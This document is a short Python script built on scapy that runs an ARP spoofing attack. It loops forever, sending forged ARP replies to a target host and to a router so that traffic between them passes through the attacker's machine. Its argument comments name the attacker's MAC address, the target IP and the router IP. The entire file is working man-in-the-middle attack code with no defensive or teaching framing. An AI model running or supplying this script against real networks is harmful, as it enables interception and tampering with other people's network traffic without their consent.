#!/usr/bin/env python
# coding=utf-8

import sys
import time
import signal
from scapy.all import *

def spoof(t1, t2, a_mac):
        arp1 = ARP(op=2, psrc=t2, pdst=t1, hwdst=a_mac)
        arp2 = ARP(op=2, psrc=t1, pdst=t2, hwdst=a_mac)
        send(arp1)
        send(arp2)

def main():
        while True:
                spoof(target1, target2, macaddr)
                time.sleep(1)

macaddr = sys.argv[1] # Attacker Physical Address
target1 = sys.argv[2] # Target IP Address    
target2 = sys.argv[3] # Router IP Address

if __name__ == "__main__":
        main()
